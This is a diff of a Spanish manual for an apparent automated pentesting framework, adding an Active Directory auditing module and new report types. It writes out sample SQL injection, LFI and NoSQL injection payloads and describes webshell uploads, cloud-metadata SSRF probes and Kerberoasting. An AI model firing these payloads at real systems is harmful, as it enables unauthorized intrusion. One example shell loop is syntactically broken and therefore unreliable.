@@ -1,5 +1,5 @@
-# ⚡ WriestTavo v4.0 — Manual Completo
-### Bug Bounty · Pentesting · Vuln Analysis · CTF
+# ⚡ WriestTavo v4.1 — Manual Completo
+### Bug Bounty · Pentesting · AD Audit · Vuln Analysis · CTF
 **By WRIΞSTTAV0**
 
 ---
@@ -11,29 +11,30 @@
 ## 📋 Tabla de Contenidos
 
 1. [¿Qué es WriestTavo?](#qué-es-wriestTavo)
-2. [Instalación y Requisitos](#instalación-y-requisitos)
-3. [Primeros Pasos](#primeros-pasos)
-4. [Modos de Escaneo](#modos-de-escaneo)
-5. [Menú de Presets](#menú-de-presets)
-6. [Los 44 Módulos — Referencia Completa](#los-44-módulos)
-7. [Sistema INTEL — Inteligencia Compartida](#sistema-intel)
-8. [Sistema de Actualización](#sistema-de-actualización)
-9. [Agregar Payloads Propios](#agregar-payloads-propios)
-10. [Agregar Módulos Propios](#agregar-módulos-propios)
-11. [Exploit Intelligence — EDB + NVD + GHSA](#exploit-intelligence)
-12. [El Reporte HTML](#el-reporte-html)
-13. [Flujo Completo de Trabajo](#flujo-completo-de-trabajo)
-14. [Comandos de Referencia Rápida](#comandos-de-referencia-rápida)
-15. [Estructura de Archivos](#estructura-de-archivos)
-16. [Preguntas Frecuentes](#preguntas-frecuentes)
+2. [Novedades v4.1](#novedades-v41)
+3. [Instalación y Requisitos](#instalación-y-requisitos)
+4. [Primeros Pasos](#primeros-pasos)
+5. [Modos de Escaneo](#modos-de-escaneo)
+6. [Menú de Presets](#menú-de-presets)
+7. [Los 45 Módulos — Referencia Completa](#los-45-módulos)
+8. [Módulo 45: ADPulse — Active Directory Auditor](#módulo-45-adpulse)
+9. [Sistema INTEL — Inteligencia Compartida](#sistema-intel)
+10. [Sistema de Reportes — 4 Tipos](#sistema-de-reportes)
+11. [Sistema de Actualización](#sistema-de-actualización)
+12. [Agregar Payloads Propios](#agregar-payloads-propios)
+13. [Catálogo de Payloads Modernos](#catálogo-de-payloads-modernos)
+14. [Agregar Módulos Propios](#agregar-módulos-propios)
+15. [Exploit Intelligence — EDB + NVD + GHSA](#exploit-intelligence)
+16. [Flujo Completo de Trabajo](#flujo-completo-de-trabajo)
+17. [Comandos de Referencia Rápida](#comandos-de-referencia-rápida)
+18. [Estructura de Archivos](#estructura-de-archivos)
+19. [Preguntas Frecuentes](#preguntas-frecuentes)
 
 ---
 
 ## ¿Qué es WriestTavo?
 
-WriestTavo es un **framework de pentesting automatizado** con 44 módulos que cubren el stack tecnológico moderno completo. No es solo un escáner — es un sistema de **inteligencia compartida**: cada módulo aprende del anterior y adapta sus técnicas automáticamente.
-
-### Lo que lo hace diferente
+WriestTavo es un **framework de pentesting automatizado** con 45 módulos que cubren el stack tecnológico moderno completo. No es solo un escáner — es un sistema de **inteligencia compartida**: cada módulo aprende del anterior y adapta sus técnicas automáticamente.
 
 ```
 Scanner normal:       WriestTavo:
@@ -48,6 +49,10 @@ Scanner normal:       WriestTavo:
                        SSTI prueba payloads Blade/Twig
                             ↓
                        EDB busca "laravel" en exploits
+                            ↓
+                       ADPulse audita si detecta DC/LDAP
+                            ↓
+                       3 reportes: Cliente / Censurado / Pentester
 ```
 
 ### Cobertura del Stack Moderno
@@ -61,13 +66,54 @@ Scanner normal:       WriestTavo:
 | **Servidores** | Apache, Nginx, IIS (Windows), Caddy |
 | **Cloud/Infra** | Docker, Kubernetes, AWS/GCP/Azure metadata, Prometheus, Grafana |
 | **APIs** | REST, GraphQL, Swagger/OpenAPI, FastAPI /docs, gRPC básico |
+| **Active Directory** | Kerberoasting, AS-REP, ADCS ESC1/ESC2, Delegation, LAPS, SMB Signing, GPOs |
+
+---
+
+## Novedades v4.1
+
+### 🏢 Módulo 45 — ADPulse Active Directory Auditor
+
+35 checks de seguridad sobre Active Directory mediante conexión LDAP de **solo lectura**. Integrado completamente en el sistema INTEL y reportes.
+
+| Categoría | Checks |
+|-----------|--------|
+| **Credenciales** | Null Bind, Kerberoasting, AS-REP Roasting, Contraseñas en Description, PASSWD_NOTREQD |
+| **Privilegios** | Unconstrained/Constrained Delegation, adminCount=1 huérfano, grupos nested en DA, LAPS |
+| **Certificados (ADCS)** | ESC1 (Enrollee Supplies Subject), ESC2 (Any Purpose EKU) |
+| **Configuración** | KRBTGT age, política de contraseñas, nivel funcional, MachineAccountQuota, trusts |
+| **Protocolos** | SMB Signing, LDAP Signing, Protected Users group, Recycle Bin |
+| **Cuentas** | Guest habilitado, inactivas >90 días, sin expiración, dual-use con email |
+| **Auditoría** | GPOs, Fine-Grained PSO, configuración de audit policy |
+| **Recolección** | BloodHound automático, dump completo usuarios/grupos/equipos |
+
+### 📊 Sistema de 4 Reportes
+
+Al terminar cada scan se generan **4 archivos HTML** simultáneamente:
+
+| # | Archivo | Audiencia | Contenido |
+|---|---------|-----------|-----------|
+| Original | `reporte_TARGET_FECHA.html` | Auditor | Reporte técnico clásico WriestTavo |
+| 1 | `reporte_CLIENTE_*.html` | Equipo IT / Cliente | Ejecutivo + payloads confirmados con badge |
+| 2 | `reporte_CENSURADO_*.html` | Dirección / Legal / Terceros | IPs, URLs, comandos y hashes redactados |
+| 3 | `reporte_PENTESTER_*.html` | Analista / Red Team | Técnico completo + attack chains + tips |
+
+### 💣 Tracking de Payloads Efectivos
+
+Los módulos ahora registran automáticamente qué payloads funcionaron:
+```bash
+register_payload "SQLi" "' OR SLEEP(3)--" "https://target.com/search?q=" "Delay 3.1s detectado"
+register_payload "LFI"  "/etc/passwd" "https://target.com/?file=" "root:x:0:0 encontrado"
+```
+Estos aparecen en el Reporte Cliente como `✓ INYECCIÓN CONFIRMADA` y en el Reporte Pentester como tabla de evidencia.
 
 ---
 
 ## Instalación y Requisitos
 
 ### Requisito Base
-- **Kali Linux** (recomendado) o cualquier distro con las herramientas
+
+- **Kali Linux** (recomendado) o cualquier distro Debian/Ubuntu
 - `sudo` / root
 - Python 3.x (ya incluido en Kali)
 - Conexión a internet (para módulos online, EDB, NVD)
@@ -75,34 +121,27 @@ Scanner normal:       WriestTavo:
 ### Instalación Automática (recomendado)
 
 ```bash
-# 1. Dar permisos al script
 chmod +x wriestTavo.sh
-
-# 2. Instalador automático — instala TODAS las dependencias
 sudo ./wriestTavo.sh --install
 ```
 
-El instalador cubre:
+El instalador cubre automáticamente:
 
-**Via apt:**
 ```
+# Via apt:
 nmap  curl  python3  python3-pip  git  wget  whatweb  nikto
 gobuster  wafw00f  sslscan  dnsrecon  smtp-user-enum  snmp
 sqlmap  wpscan  crackmapexec  commix  enum4linux-ng
-seclists  wordlists  exploitdb
-```
+seclists  wordlists  exploitdb  ldap-utils
 
-**Via Go (si está instalado):**
-```
+# Via Go:
 nuclei    subfinder    dalfox
+
+# Via pip3:
+arjun    dnsrecon    theHarvester    bloodhound
 ```
 
-**Via pip3:**
-```
-arjun    dnsrecon    theHarvester
-```
-
-### Instalación Manual (herramientas clave)
+### Instalación Manual
 
 ```bash
 # Core
@@ -132,570 +171,933 @@ sudo apt install -y seclists wordlists
 go install github.com/hahwul/dalfox/v2@latest
 ```
 
+### Instalación Extra para ADPulse (Módulo 45)
+
+```bash
+# LDAP — requerido para ADPulse
+sudo apt install -y ldap-utils
+
+# Impacket — para attack chains en Reporte Pentester
+sudo apt install -y python3-impacket
+# o la versión más actualizada:
+pip3 install impacket --break-system-packages
+
+# BloodHound Python — recolección automática desde ADPulse
+pip3 install bloodhound --break-system-packages
+
+# Certipy — ADCS attack chains
+pip3 install certipy-ad --break-system-packages
+
+# BloodHound GUI (para analizar los datos recolectados)
+sudo apt install -y bloodhound neo4j
+```
+
+### Instalación Extra para los 3 Reportes
+
+Los reportes son HTML puro — no requieren dependencias adicionales. Se abren en cualquier navegador:
+
+```bash
+# Abrir reportes automáticamente al terminar el scan:
+firefox wriestTavo_results/reporte_CLIENTE_*.html &
+firefox wriestTavo_results/reporte_PENTESTER_*.html &
+
+# O todos a la vez:
+for f in wriestTavo_results/reporte_*.html; do firefox "$f" &; done
+```
+
+> **Nota**: Los reportes usan fuentes del sistema y no requieren internet para verse correctamente.
+
 ---
 
 ## Primeros Pasos
 
-### Ejecución Básica
-
 ```bash
-# Forma 1: por IP
-sudo ./wriestTavo.sh 192.168.1.100
-
-# Forma 2: por dominio
-sudo ./wriestTavo.sh ejemplo.com
-
-# Forma 3: URL completa (recomendado — preserva protocolo y path)
-sudo ./wriestTavo.sh https://app.ejemplo.com
-
-# Forma 4: con modo específico
-sudo ./wriestTavo.sh --mode stealth 10.10.10.5
-sudo ./wriestTavo.sh --mode aggressive https://target.com
-
-# Forma 5: output personalizado
-sudo ./wriestTavo.sh -o /tmp/mi_scan https://target.com
-```
-
-### Primera Ejecución Recomendada
-
-```bash
-# Paso 1: Instalar herramientas
+# 1. Instalar dependencias
 sudo ./wriestTavo.sh --install
 
-# Paso 2: Actualizar bases de datos (CVEs, nuclei, SecLists, EDB)
+# 2. Actualizar BD de exploits y CVEs
 sudo ./wriestTavo.sh --update
 
-# Paso 3: Configurar actualización automática diaria
+# 3. (Opcional) Configurar auto-actualización diaria
 sudo ./wriestTavo.sh --cron
 
-# Paso 4: Primer scan
-sudo ./wriestTavo.sh https://mi-target.com
+# 4. Primer scan
+sudo ./wriestTavo.sh 192.168.1.100
+# → Al lanzar aparece el menú de presets
 ```
 
-Al ejecutar el scan, el script te pregunta:
-```
-⚠  AVISO LEGAL: Solo usar en sistemas con autorización explícita.
-  Confirmo que tengo autorización [s/N]: s
+### Ejemplos de uso rápido
 
-[Menú de módulos aparece aquí]
+```bash
+sudo ./wriestTavo.sh 192.168.1.100           # IP directa
+sudo ./wriestTavo.sh https://app.ejemplo.com  # HTTPS con ruta
+sudo ./wriestTavo.sh --mode stealth target.com       # Silencioso (WAF bypass)
+sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Agresivo (CTF/HTB)
 ```
 
 ---
 
 ## Modos de Escaneo
 
-| Modo | Flag | Descripción | Uso recomendado |
-|------|------|-------------|-----------------|
-| `normal` | (default) | Balance entre velocidad y detección | Auditorías generales |
-| `stealth` | `--mode stealth` | Más lento, menos ruido, delay entre peticiones | Bug Bounty con WAF, pentest silencioso |
-| `aggressive` | `--mode aggressive` | Sin límites, máximo ruido, más payloads | CTF, laboratorios, HackTheBox |
+| Modo | Puerto Scan | Delay | Threads | Ideal para |
+|------|------------|-------|---------|-----------|
+| `normal` | top-1000 | Sin delay | Estándar | Pentesting general |
+| `stealth` | top-500 | +delay WAF | Reducidos | Bug Bounty, producción |
+| `aggressive` | todos (-p-) | Sin delay | Máximos | CTF, HTB, lab |
 
-### Diferencias técnicas por modo
-
-```
-normal:    nmap top-1000 puertos, delay normal, gobuster threads estándar
-stealth:   nmap top-500 puertos, +delay WAF, gobuster threads reducidos
-aggressive: nmap full scan (-p-), sin delay, nuclei full templates, dalfox maximal
+```bash
+sudo ./wriestTavo.sh --mode stealth https://target.com
+sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
 ```
 
 ---
 
 ## Menú de Presets
 
-Al ejecutar el script, aparece este menú con 11 opciones:
-
 ```
-[1]  Full Scan v4.0         → 44 módulos en orden óptimo (7 fases)
-[2]  Recon OSINT            → crt.sh + theHarvester + dnsrecon + subdominios
-[3]  Web + SSL              → WAF + nikto + nuclei + gobuster + sslscan + arjun
-[4]  Bug Bounty Pro         → recon + framework + injection + CORS + JWT + SSRF + EDB
-[5]  Injection Suite        → SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CORS + CMDi
-[6]  API Modern             → endpoints + GraphQL + Swagger + arjun + JWT + CORS
-[7]  Windows/Infra          → IIS + NTLM + RDP + SMB + Docker + K8s + SNMP
-[8]  Framework Deep         → whatweb + framework_scan + SSTI + SSRF + rutas críticas
-[9]  WordPress              → wpscan + nuclei + gobuster + SQLi + XSS
-[10] CTF/HTB Mode           → todos los módulos en modo agresivo
-[11] Custom                 → elegir módulos individuales (1-44)
+  ╔═══ WriestTavo v4.1 — 45 módulos ═══╗
+  ║  [1] Full Scan (45 módulos, 7 fases)  ║
+  ║  [2] Recon OSINT          (pasivo)    ║
+  ║  [3] Web + SSL                        ║
+  ║  [4] Bug Bounty Pro                   ║
+  ║  [5] Injection Suite                  ║
+  ║  [6] API Modern                       ║
+  ║  [7] Windows/Infra + AD               ║
+  ║  [8] Framework Deep                   ║
+  ║  [9] WordPress                        ║
+  ║ [10] CTF/HTB Mode                     ║
+  ║ [11] Custom (elegir módulos 1-45)     ║
+  ╚═════════════════════════════════════╝
 ```
 
-### ¿Cuándo usar cada uno?
-
-| Preset | Situación ideal |
-|--------|----------------|
-| `[1] Full Scan` | Primera vez en un target, audit completo |
-| `[2] OSINT` | Fase de reconocimiento pasivo, no tocar el target |
-| `[3] Web + SSL` | Target web con certificado, verificar configuración |
-| `[4] Bug Bounty Pro` | Programa de bug bounty, máxima cobertura con reportes |
-| `[5] Injection Suite` | Cuando ya tienes URLs con parámetros para probar |
-| `[6] API Modern` | APIs REST/GraphQL, apps SPA modernas |
-| `[7] Windows/Infra` | Entornos Windows, Active Directory, infraestructura |
-| `[8] Framework Deep` | Cuando sabes el framework y quieres rutas específicas |
-| `[9] WordPress` | Sitios WordPress con plugins/themes |
-| `[10] CTF/HTB` | Laboratorios y CTFs, sin restricciones |
-| `[11] Custom` | Cuando sabes exactamente qué módulos necesitas |
+| Preset | Módulos incluidos | Uso típico |
+|--------|-------------------|-----------|
+| **[1] Full Scan** | Los 45 módulos en 7 fases incluyendo ADPulse | Auditoría completa |
+| **[2] Recon OSINT** | crtsh + theHarvester + dnsrecon | Reconocimiento 100% pasivo |
+| **[3] Web + SSL** | WAF + nikto + nuclei + gobuster + sslscan | Web rápido |
+| **[4] Bug Bounty Pro** | Recon + web + injection + CORS + JWT + SSRF + EDB | Bug bounty |
+| **[5] Injection Suite** | SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CMDi | Testing de inyecciones |
+| **[6] API Modern** | Endpoints + GraphQL + Swagger + JWT + CORS | APIs REST/GraphQL |
+| **[7] Windows/Infra + AD** | IIS + SMB + Docker + K8s + SNMP + **ADPulse** | Entornos Windows/AD |
+| **[8] Framework Deep** | framework_scan + SSTI + rutas críticas | Laravel/Django/Rails |
+| **[9] WordPress** | wpscan + nuclei + gobuster + SQLi + XSS | Auditoría WordPress |
+| **[10] CTF/HTB** | Todos los módulos modo agresivo incluyendo ADPulse | CTF/laboratorio |
+| **[11] Custom** | Elegir módulos 1-45 individualmente | Manual / targeted |
 
 ---
 
-## Los 44 Módulos
+## Los 45 Módulos
 
-### FASE 1: Reconocimiento Pasivo (sin tocar el target)
+### FASE 1: Reconocimiento Pasivo
 
 | # | Módulo | Qué hace | Retroalimenta |
 |---|--------|----------|---------------|
-| 26 | `crtsh` | Consulta Certificate Transparency logs para descubrir subdominios. 100% pasivo. | `INTEL_SUBDOMAINS[]` |
-| 17 | `theharvester` | Recolecta emails, IPs y subdominios desde Google, Bing, crtsh, urlscan. Sin tocar el target. | `INTEL_SUBDOMAINS[]`, emails |
-| 18 | `dnsrecon` | DNS completo: zone transfer (CRÍTICO si lo permite), SPF, DMARC, MX, fuerza bruta. | `INTEL_SERVICES[]` |
+| 26 | `crtsh` | Subdominios desde Certificate Transparency logs. 100% pasivo. | `INTEL_SUBDOMAINS[]` |
+| 17 | `theharvester` | Emails, IPs, subdominios desde Google, Bing, urlscan. | `INTEL_SUBDOMAINS[]` |
+| 18 | `dnsrecon` | Zone transfer, SPF, DMARC, MX, fuerza bruta DNS. | `INTEL_SERVICES[]` |
 
 ### FASE 2: Infraestructura
 
 | # | Módulo | Qué hace | Retroalimenta |
 |---|--------|----------|---------------|
-| 1 | `ttl_os` | Detecta OS por TTL (64=Linux, 128=Windows). Sin hacer ruido. | `INTEL_OS` |
-| 2 | `port_scan` | Escaneo de puertos TCP con nmap. Detecta puertos web, SMB, SNMP, etc. | `WEB_PORTS[]`, activa módulos condicionalmente |
-| 3 | `version_scan` | Detecta versiones exactas de servicios. Identifica tech stack. | `INTEL_TECHNOLOGIES[]`, `INTEL_OS` confirmado |
-| 38 | `infra_exposure` | Busca Docker API (2375/2376), Kubernetes (8001/6443/10250), Prometheus, Grafana, Kibana sin auth. | `INTEL_DOCKER_EXPOSED`, `INTEL_K8S_EXPOSED` |
+| 1 | `ttl_os` | Detecta OS por TTL (64=Linux, 128=Windows). | `INTEL_OS` |
+| 2 | `port_scan` | nmap TCP. Detecta puertos web, SMB, LDAP, SNMP, etc. | `WEB_PORTS[]`, activa módulos condicionalmente |
+| 3 | `version_scan` | Versiones exactas de servicios. | `INTEL_TECHNOLOGIES[]` |
+| 38 | `infra_exposure` | Docker API, Kubernetes, Prometheus, Grafana sin auth. | `INTEL_DOCKER_EXPOSED`, `INTEL_K8S_EXPOSED` |
 
 ### FASE 3: Servicios de Red
 
 | # | Módulo | Qué hace | Se activa cuando |
 |---|--------|----------|-----------------|
-| 10 | `smb` | SMB null sessions, shares, enum4linux-ng. | Puerto 445/139 abierto |
-| 29 | `cme` | CrackMapExec: SMB signing, LDAP usuarios/grupos, WinRM. | Puerto 445/389/5985 |
-| 28 | `snmp` | Prueba community strings por defecto (public/private/cisco). Expone config de red. | Puerto 161 abierto |
-| 27 | `smtp_enum` | Enumera usuarios válidos con VRFY sin autenticación. | Puerto 25/465/587 |
-| 9 | `subdominios` | Fuerza bruta de subdominios con subfinder/amass. | Siempre (si es dominio) |
+| 10 | `smb` | SMB null sessions, shares, enum4linux-ng. | Puerto 445/139 |
+| 29 | `cme` | CrackMapExec: SMB signing, LDAP, WinRM. | Puerto 445/389/5985 |
+| 28 | `snmp` | Community strings por defecto. | Puerto 161 |
+| 27 | `smtp_enum` | Enumera usuarios con VRFY sin autenticación. | Puerto 25/465/587 |
+| 9 | `subdominios` | Fuerza bruta subdominios con subfinder/amass. | Siempre si es dominio |
 
 ### FASE 4: Fingerprinting Web
 
 | # | Módulo | Qué hace | Retroalimenta |
 |---|--------|----------|---------------|
-| 4 | `waf` | Detecta WAF (Cloudflare, Akamai, AWS, F5, etc.) con wafw00f. | `INTEL_WAF_DETECTED`, `INTEL_WAF_NAME`, ajusta delay automático |
-| 5 | `http_headers` | Analiza headers de seguridad: CSP, HSTS, X-Frame-Options, cookies sin Secure/HttpOnly, server version. | `INTEL_TECHNOLOGIES[]` |
-| 19 | `sslscan` | TLS/SSL: versiones obsoletas (1.0/1.1/SSLv3), ciphers débiles (RC4/3DES), Heartbleed, certificado expirado. | Solo si puerto 443/8443 |
-| 6 | `whatweb` | Identifica CMS, framework, librerías, versiones. Detección de 50+ tecnologías. | `INTEL_CMS`, `INTEL_FRAMEWORK_JS`, `INTEL_FRAMEWORK_BACKEND` |
-| 25 | `wpscan` | Enumera usuarios, plugins y themes de WordPress con CVEs. | Solo si `INTEL_CMS=wordpress` |
-| 7 | `nikto` | Escaneo genérico de vulnerabilidades web conocidas. | `INTEL_NIKTO_FINDINGS` |
+| 4 | `waf` | Detecta WAF (Cloudflare, Akamai, AWS WAF, F5…). Ajusta delay automáticamente. | `INTEL_WAF_DETECTED`, `INTEL_SCAN_DELAY` |
+| 5 | `http_headers` | CSP, HSTS, X-Frame-Options, cookies sin flags, server version. | `INTEL_TECHNOLOGIES[]` |
+| 19 | `sslscan` | TLS/SSL: versiones obsoletas, ciphers débiles, Heartbleed, cert expirado. | Solo si puerto 443/8443 |
+| 6 | `whatweb` | CMS, framework, librerías. 50+ tecnologías detectadas. | `INTEL_CMS`, `INTEL_FRAMEWORK_*` |
+| 25 | `wpscan` | Usuarios, plugins, themes WordPress con CVEs. | Solo si `INTEL_CMS=wordpress` |
+| 7 | `nikto` | Vulnerabilidades web conocidas genéricas. | `INTEL_NIKTO_FINDINGS` |
 
 ### FASE 5: Escaneo Profundo
 
 | # | Módulo | Qué hace | Se adapta según |
 |---|--------|----------|----------------|
-| 20 | `nuclei` | 9000+ templates: CVEs, misconfigs, exposures, tecnologías. El estándar de bug bounty. | `INTEL_CMS` → templates WP; `INTEL_WAF_DETECTED` → headers evasión |
-| 30 | `framework_scan` | Busca rutas críticas específicas del framework: `.env`, `/telescope`, `/_next/`, `/docs`, `trace.axd`, etc. | Requiere `INTEL_FRAMEWORK_*` detectado |
-| 8 | `gobuster` | Fuerza bruta de directorios y archivos. | `INTEL_WORDLIST_EXTRA` según CMS; `INTEL_WAF_DETECTED` → delay |
-| 24 | `arjun` | Descubre parámetros GET/POST ocultos. Detecta: debug, admin, cmd, file, redirect. | Resultado va a `INTEL_INJECTABLE_URLS[]` |
-| 15 | `endpoints` | Descubre endpoints API: `/api/v1/`, `/graphql`, `/swagger`, `/actuator`, `/metrics`. | `INTEL_API_ENDPOINTS[]`, `INTEL_GRAPHQL_URL`, `INTEL_SWAGGER_URL` |
-| 16 | `js_analysis` | Extrae secrets, JWTs, API keys, endpoints y frameworks de bundles JavaScript. | `INTEL_JWT_TOKENS[]`, `INTEL_JS_SECRETS[]`, `INTEL_FRAMEWORK_JS` |
+| 20 | `nuclei` | 9000+ templates: CVEs, misconfigs, exposures. Estándar bug bounty. | `INTEL_CMS` → templates específicos |
+| 30 | `framework_scan` | Rutas críticas del framework: `.env`, `/telescope`, `/_next/`, `/actuator`, etc. | `INTEL_FRAMEWORK_*` |
+| 8 | `gobuster` | Fuerza bruta directorios. Wordlist según CMS detectado. | `INTEL_WORDLIST_EXTRA` por CMS |
+| 24 | `arjun` | Descubre parámetros GET/POST ocultos: debug, admin, cmd, file, redirect. | → `INTEL_INJECTABLE_URLS[]` |
+| 15 | `endpoints` | Endpoints API: `/api/v1/`, `/graphql`, `/swagger`, `/actuator`. | `INTEL_GRAPHQL_URL`, `INTEL_SWAGGER_URL` |
+| 16 | `js_analysis` | Secrets, JWTs, API keys en JS bundles. | `INTEL_JWT_TOKENS[]`, `INTEL_JS_SECRETS[]` |
 
 ### FASE 6: Vulnerabilidades Web
 
 | # | Módulo | Qué hace | Se activa/adapta cuando |
 |---|--------|----------|------------------------|
-| 13 | `sqli` | Prueba SQLi básico con payloads en URLs de gobuster/arjun. Detecta errores y time-based. | `INTEL_INJECTABLE_URLS[]`; payloads según DB detectada (MySQL/PG/MSSQL) |
-| 21 | `sqlmap` | Confirma y explota SQLi encontrado por módulo 13. Usa `--tamper` si hay WAF. | **Solo si** `INTEL_SQLI_FOUND=true` |
-| 36 | `nosqli` | Inyección NoSQL: `{$gt:""}`, `{$where:"sleep(2000)"}`, bypass de login MongoDB. | **Solo si** mongodb en `INTEL_TECHNOLOGIES` o hay API endpoints |
-| 14 | `xss` | Prueba XSS reflejado con payloads en parámetros de URLs. | `INTEL_INJECTABLE_URLS[]` |
-| 22 | `dalfox` | XSS avanzado: DOM-based, Header-based, contexto JS, codificaciones complejas. | Profundiza lo encontrado por módulo 14 |
-| 23 | `commix` | Command injection / OS command execution. RCE completo. | `INTEL_INJECTABLE_URLS[]` |
-| 31 | `lfi` | Path Traversal y LFI. **Escala automáticamente**: si confirma LFI → intenta RFI + PHP wrappers + log poisoning. | Payloads extra desde `INTEL_EXTRA_PAYLOADS_LFI[]` |
-| 32 | `ssrf` | Server-Side Request Forgery. **Si confirma**: prueba AWS metadata `169.254.169.254`, GCP `metadata.google.internal`, Azure automáticamente. | `INTEL_INJECTABLE_URLS[]`; si encuentra → `INTEL_SSRF_FOUND=true` |
-| 33 | `ssti` | Template injection: Jinja2, Twig, Blade, Smarty, ERB, Freemarker. RCE si se confirma. | Requiere framework con template engine en `INTEL_FRAMEWORK_BACKEND` |
-| 34 | `cors` | Prueba CORS misconfig: origin reflection, null origin, wildcard + credentials. **Genera cors_poc.html automáticamente.** | Si encuentra → `INTEL_CORS_VULN=true`, `INTEL_CORS_ORIGIN` |
-| 35 | `jwt` | Analiza JWTs encontrados en headers/JS. Prueba: `alg:none`, RS256→HS256 confusion, crack con hashcat+rockyou. | `INTEL_JWT_TOKENS[]` de módulo 16 |
-| 39 | `xxe` | XML External Entity en APIs XML, SOAP, SVG upload. Lee `/etc/passwd` si vulnerable. | `INTEL_TECHNOLOGIES` con java/aspnet/php o `INTEL_API_ENDPOINTS[]` |
-| 40 | `idor_redirect` | IDOR: detecta IDs incrementales y respuestas diferentes. Open Redirect: prueba 10 payloads en 30 parámetros. | `INTEL_API_ENDPOINTS[]`, `INTEL_INJECTABLE_URLS[]` |
-| 41 | `iis_windows` | IIS específico: ShortName 8.3, trace.axd, WebDAV, NTLM exposure, ViewState sin MAC. | **Solo si** `INTEL_OS=windows` o iis/aspnet en `INTEL_TECHNOLOGIES` |
-| 37 | `http_methods` | Prueba PUT, DELETE, TRACE, CONNECT, PATCH, DEBUG. PUT → intenta subir webshell de prueba. | Todos los targets web |
+| 13 | `sqli` | SQLi básico: errores, time-based. Payloads por DB detectada. | `INTEL_INJECTABLE_URLS[]` |
+| 21 | `sqlmap` | Confirma y explota SQLi. `--tamper` si hay WAF. | **Solo si** `INTEL_SQLI_FOUND=true` |
+| 36 | `nosqli` | MongoDB injection: `{$gt:""}`, bypass de login. | Si MongoDB en `INTEL_TECHNOLOGIES` |
+| 14 | `xss` | XSS reflejado en parámetros. | `INTEL_INJECTABLE_URLS[]` |
+| 22 | `dalfox` | XSS avanzado: DOM-based, Header-based, CSP bypass. | Profundiza módulo 14 |
+| 23 | `commix` | Command injection / OS RCE. | `INTEL_INJECTABLE_URLS[]` |
+| 31 | `lfi` | LFI/Path Traversal. Escala: LFI → RFI → PHP wrappers → log poisoning. | Payloads de `INTEL_EXTRA_PAYLOADS_LFI[]` |
+| 32 | `ssrf` | SSRF. Si confirma → prueba AWS/GCP/Azure metadata automáticamente. | `INTEL_INJECTABLE_URLS[]` |
+| 33 | `ssti` | Template injection: Jinja2, Twig, Blade, Smarty, ERB. RCE si confirma. | `INTEL_FRAMEWORK_BACKEND` con engine |
+| 34 | `cors` | CORS misconfig. **Genera cors_poc.html automáticamente.** | → `INTEL_CORS_VULN=true` |
+| 35 | `jwt` | Analiza JWTs: alg:none, RS256→HS256, crack con hashcat. | `INTEL_JWT_TOKENS[]` de módulo 16 |
+| 39 | `xxe` | XXE en APIs XML, SOAP, SVG upload. | `INTEL_TECHNOLOGIES` con java/php/.net |
+| 40 | `idor_redirect` | IDOR en IDs incrementales. Open Redirect en parámetros de redirect. | `INTEL_API_ENDPOINTS[]` |
+| 41 | `iis_windows` | ShortName 8.3, WebDAV, NTLM exposure, ViewState sin MAC. | Solo si `INTEL_OS=windows` |
+| 37 | `http_methods` | PUT, DELETE, TRACE, CONNECT. PUT → intenta subir webshell de prueba. | Todos los targets web |
 
 ### FASE 7: Post-Scan
 
 | # | Módulo | Qué hace |
 |---|--------|----------|
-| 43 | `edb_intel` | **Exploit Intelligence**: cruza stack vs EDB local + EDB online + NVD CVEs CVSS≥9 + GitHub Advisories. |
-| 11 | `vuln_scan` | nmap NSE scripts de vulnerabilidades sobre puertos detectados. |
-| 12 | `searchsploit` | Busca exploits para todas las versiones detectadas en el scan de versiones. |
-| 44 | `edb_search` | Búsqueda manual interactiva en EDB + NVD + GHSA desde el script. |
+| 43 | `edb_intel` | Exploit Intelligence: EDB local + EDB online + NVD CVEs (CVSS≥9) + GHSA |
+| 11 | `vuln_scan` | nmap NSE vuln scripts sobre puertos detectados |
+| 12 | `searchsploit` | Busca exploits para versiones exactas detectadas |
+| 44 | `edb_search` | Búsqueda manual interactiva en EDB + NVD + GHSA |
+| **45** | **`adpulse`** | **ADPulse: 35 checks de seguridad en Active Directory (LDAP solo lectura)** |
+
+---
+
+## Módulo 45: ADPulse
+
+ADPulse es el auditor de Active Directory integrado en WriestTavo. Usa una conexión **LDAP de solo lectura** — no modifica ningún objeto del directorio.
+
+### Activación
+
+```bash
+# Desde el menú
+sudo ./wriestTavo.sh 192.168.1.10   # IP del Domain Controller
+# → [45] ADPulse Audit  (o [7] Windows/Infra, [10] CTF/HTB)
+
+# Al ejecutarse pide 3 datos:
+#   IP del DC: 192.168.1.10
+#   Dominio FQDN: corp.local
+#   Usuario: ldapuser
+#   Contraseña: ****
+```
+
+### Los 35 Checks
+
+| # | Check | Severidad | Técnica de Ataque Relacionada |
+|---|-------|-----------|-------------------------------|
+| 1 | Null Bind LDAP | 🔴 CRÍTICO | Enumeración anónima |
+| 2 | **Kerberoasting** (SPNs) | 🔴 CRÍTICO | Crack offline de TGS hashes |
+| 3 | **AS-REP Roasting** | 🔴 CRÍTICO | Crack offline sin preauth |
+| 4 | **Unconstrained Delegation** | 🔴 CRÍTICO | Robo de TGT de DA |
+| 5 | Constrained Delegation | 🟠 MEDIO | S4U2Self/S4U2Proxy abuse |
+| 6 | Grupos privilegiados (DA/EA/SA) | 🟠 ALTO | Inventario de targets |
+| 7 | **KRBTGT password age** | 🔴 CRÍTICO | Golden Ticket persistence |
+| 8 | Contraseñas sin expiración | 🟡 BAJO | Password spray |
+| 9 | Cuentas inactivas >90 días | 🟠 MEDIO | Cuentas abandonadas |
+| 10 | Política de contraseñas débil | 🟠 ALTO | Password spraying |
+| 11 | adminCount=1 huérfano (SDProp) | 🟠 ALTO | ACL abuse |
+| 12 | **Contraseñas en Description** | 🔴 CRÍTICO | Credenciales en texto claro |
+| 13 | DCSync permissions | 🔴 CRÍTICO | Dump de hashes NTLM |
+| 14 | **LAPS** no instalado | 🟠 ALTO | Lateral movement por admins locales |
+| 15 | **ADCS ESC1** | 🔴 CRÍTICO | Impersonation de cualquier usuario |
+| 16 | **ADCS ESC2** (Any Purpose EKU) | 🔴 CRÍTICO | Certificado para cualquier uso |
+| 17 | Guest account habilitado | 🟠 ALTO | Reconocimiento inicial |
+| 18 | **SMB Signing no requerido** | 🔴 CRÍTICO | NTLM Relay attack |
+| 19 | LDAP Signing no enforced | 🟠 MEDIO | LDAP Relay |
